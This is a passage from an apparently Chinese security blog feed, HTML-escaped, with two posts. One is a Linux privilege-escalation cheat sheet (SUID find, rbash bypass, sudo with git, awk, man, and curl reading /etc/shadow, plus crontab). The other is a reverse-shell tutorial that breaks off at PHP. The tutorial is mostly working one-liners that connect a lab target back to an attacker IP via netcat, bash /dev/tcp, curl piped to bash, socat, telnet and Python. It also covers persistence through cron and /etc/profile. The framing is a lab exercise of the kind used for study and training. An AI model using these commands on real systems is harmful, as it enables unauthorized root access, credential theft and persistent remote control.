&lt;h4 id=&#34;find提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#find提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;find提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;(DC-01)&lt;/p&gt;
&lt;p&gt;先查找拥有 suid 权限的文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410094828540.png&#34; alt=&#34;image-20210410095644313&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行提权&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;touch test.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -type f -name test.txt -exec &amp;quot;whoami&amp;quot; \; 发现是root权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -type f -name test.txt -exec &amp;quot;/bin/sh&amp;quot; \; 成功提权&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;git提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;git提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;(DC-02)&lt;/p&gt;
&lt;p&gt;寻找可用提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410095644313.png&#34; alt=&#34;image-20210122091605012&#34;&gt;&lt;/p&gt;
&lt;p&gt;绕过 rbash 进行提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410093833321.png&#34; alt=&#34;image-20210410100730655&#34;&gt;&lt;/p&gt;
&lt;p&gt;可用命令有 less、ls、scp、vi，绕过可用如下方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可使用 less 绕过：$less test  然后！‘sh’&lt;/li&gt;
&lt;li&gt;使用 ls 绕过：$man ls  然后！‘sh’&lt;/li&gt;
&lt;li&gt;使用 vi 绕过：$vi test  然后:!/bin/sh 或者 :!/bin/bash&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还可以用 BASH_CMDS [a]=/bin/sh;a 直接绕过&lt;/p&gt;
&lt;p&gt;或者更改环境变量，并查看 flag3.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;尝试 git 提权&lt;/strong&gt;：可使用 sudo git help config 或者 sudo git -p help&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410093844939.png&#34; alt=&#34;image-20210410093833321&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;sudo提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudo提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;sudo提权&lt;/code&gt;&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;如果知道用户为空密码可以尝试sudo提权&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l， sudo su&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者su root 尝试弱口令&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;awk提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#awk提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;awk提权&lt;/code&gt;&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo awk &amp;#x27;BEGIN&amp;#123;system(&amp;quot;/bin/sh&amp;quot;)&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提权成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410100702235.png&#34; alt=&#34;image-20210410093844939&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;man提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#man提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;man提权&lt;/code&gt;&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo man man&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410100730655.png&#34; alt=&#34;image-20210410100740319&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410100740319.png&#34; alt=&#34;image-20210410100702235&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;curl提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;curl提权&lt;/code&gt;&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo curl file:///etc/shadow&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410100812432.png&#34; alt=&#34;image-20210410101229024&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;crontab提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crontab提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;crontab提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;cat /etc/crontab&lt;/p&gt;
&lt;p&gt;模拟一下&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210410101229024.png&#34; alt=&#34;image-20210410100812432&#34;&gt;&lt;/p&gt;
&lt;p&gt;防范：crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron 下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/</guid>
            <title>Linux反弹shell多种姿态</title>
            <link>https://chungod.github.io/2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/</link>
            <category>Linux反弹shell多种姿态</category>
            <pubDate>Fri, 14 May 2021 20:19:41 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;linux-反弹shell多种姿态&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-反弹shell多种姿态&#34;&gt;#&lt;/a&gt; Linux 反弹 shell 多种姿态&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;原理:反弹shell就是控制端监听在某TCP/UDP端口，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般反弹 shell 分为两种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正向连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用于情况一般为我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反向连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;反弹 shell 通常适用于如下几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目标机因防火墙受限，目标机器只能发送请求，不能接收请求。&lt;/li&gt;
&lt;li&gt;目标机端口被占用。&lt;/li&gt;
&lt;li&gt;目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。&lt;/li&gt;
&lt;li&gt;对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实验坏境&lt;/p&gt;
&lt;p&gt;攻击机：Kali（172.16.9.200）&lt;/p&gt;
&lt;p&gt;目标主机：Ubuntu（172.16.9.199）&lt;/p&gt;
&lt;h3 id=&#34;普通反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#普通反弹shell&#34;&gt;#&lt;/a&gt; 普通反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;netcat 172.16.9.200 3333 -e /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行效果：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112125091.png&#34; alt=&#34;image-20210514112125091&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112117079.png&#34; alt=&#34;image-20210514112117079&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用bash反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用bash反弹shell&#34;&gt;#&lt;/a&gt; 利用 Bash 反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/3333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行效果，直接获取到 bash&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112313985.png&#34; alt=&#34;image-20210514112313985&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112324027.png&#34; alt=&#34;image-20210514112324027&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;curl配合bash反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl配合bash反弹shell&#34;&gt;#&lt;/a&gt; Curl 配合 Bash 反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机 这里操作也很简单，借助了 Linux 中的管道&lt;/p&gt;
&lt;p&gt;首先，在攻击者 vps 的 web 目录里面创建一个 &lt;code&gt;index文件&lt;/code&gt; （index.php 或 index.html），内容如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vim /var/www/html/index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/3333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;并开启 3333 端口的监听，然后再目标机上执行如下，即可反弹 shell：&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514112954090.png&#34; alt=&#34;image-20210514112954090&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行效果：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514113144365.png&#34; alt=&#34;image-20210514113144365&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514113155864.png&#34; alt=&#34;image-20210514113155864&#34;&gt;&lt;/p&gt;
&lt;p&gt;Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现， &lt;code&gt;curl IP|bash&lt;/code&gt;  中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。&lt;/p&gt;
&lt;h3 id=&#34;写入定时任务反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写入定时任务反弹shell&#34;&gt;#&lt;/a&gt; 写入定时任务反弹 shell&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/&amp;lt;username&amp;gt; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos 系列主机)&lt;/li&gt;
&lt;li&gt;当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu 系列主机)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514142719763.png&#34; alt=&#34;image-20210514142719763&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514142726506.png&#34; alt=&#34;image-20210514142726506&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;写入etcprofile文件反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写入etcprofile文件反弹shell&#34;&gt;#&lt;/a&gt; 写入 /etc/profile 文件反弹 shell&lt;/h3&gt;
&lt;p&gt;将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/3333 0&amp;gt;&amp;amp;1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514142942758.png&#34; alt=&#34;image-20210514142942758&#34;&gt;&lt;/p&gt;
&lt;p&gt;当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514143946125.png&#34; alt=&#34;image-20210514143946125&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514144000488.png&#34; alt=&#34;image-20210514144000488&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用socat反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用socat反弹shell&#34;&gt;#&lt;/a&gt; 利用 socat 反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat TCP-LISTEN:2222 - 或&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接主机&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat tcp-connect:172.16.9.200:2222 exec:&amp;#x27;bash -li&amp;#x27;,ptr,stderr,setsid,sight,sane&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145043081.png&#34; alt=&#34;image-20210514145043081&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145051036.png&#34; alt=&#34;image-20210514145051036&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用telnet反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用telnet反弹shell&#34;&gt;#&lt;/a&gt; 利用 telnet 反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接主机&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mknod a p; telnet 172.16.9.200 2222 0&amp;lt;a | /bin/bash 1&amp;gt;a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145347386.png&#34; alt=&#34;image-20210514145347386&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145359190.png&#34; alt=&#34;image-20210514145359190&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;各种脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#各种脚本反弹shell&#34;&gt;#&lt;/a&gt; 各种脚本反弹 shell&lt;/h2&gt;
&lt;h3 id=&#34;python脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python脚本反弹shell&#34;&gt;#&lt;/a&gt; python 脚本反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接主机&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;172.16.9.200&amp;quot;,2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145830300.png&#34; alt=&#34;image-20210514145830300&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514145838061.png&#34; alt=&#34;image-20210514145838061&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;php脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php脚本反弹shell&#34;&gt;#&lt;/a&gt; php 脚本反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
